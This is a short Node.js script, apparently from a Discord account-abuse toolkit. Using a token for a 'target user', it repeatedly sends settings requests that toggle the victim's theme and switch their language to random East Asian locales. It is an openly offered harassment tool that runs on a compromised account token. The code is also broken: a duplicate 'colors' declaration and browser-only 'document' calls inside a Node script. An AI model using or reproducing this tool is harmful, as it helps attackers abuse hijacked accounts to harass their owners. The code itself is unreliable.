const {getheaders, validateToken, sleep, colors} = require("../../Settings/common")
const request = require("request");
const { colors } = require("../../Settings/common");

let keyPressed = false;

function handleKeyPress() {
  keyPressed = true;
}

document.addEventListener("keypress", handleKeyPress);

async function runCode() {
    const token = validateToken(process.argv[2])
    if(!(token)) {return}
    const run_msg = `${colors.red}This code swiches the theme of the target user. LEAVE IT OPEN TO CONTUINE ELSE PRESS ANY KEY TO QUIT! ${colors.reset}`
    while (!keyPressed) {
        var locale = ['ja', 'zh-TW', 'ko', 'zh-CN']

        request.patch({uri:"https://discord.com/api/v7/users/@me/settings", headers: getheaders(token), json: {'theme': "light", 'locale': locale[Math.floor(Math.random()*locale.length)]}}, function(error,responce,body) {
            if(error) {console.log(error)}
            if(responce.statusCode === 200) {console.log("Swiched theme.\n" + run_msg)}
        })

        await sleep(5000)

        request.patch({uri:"https://discord.com/api/v7/users/@me/settings", headers: getheaders(token), json: {'theme': "dark", 'locale': locale[Math.floor(Math.random()*locale.length)]}}, function(error,responce,body) {
            if(error) {console.log(error)}
            if(responce.statusCode === 200) {console.log("Swiched theme.\n" + run_msg)}
        })
    }
    console.log("Key pressed! Will quit now.");
    return
}   

runCode();
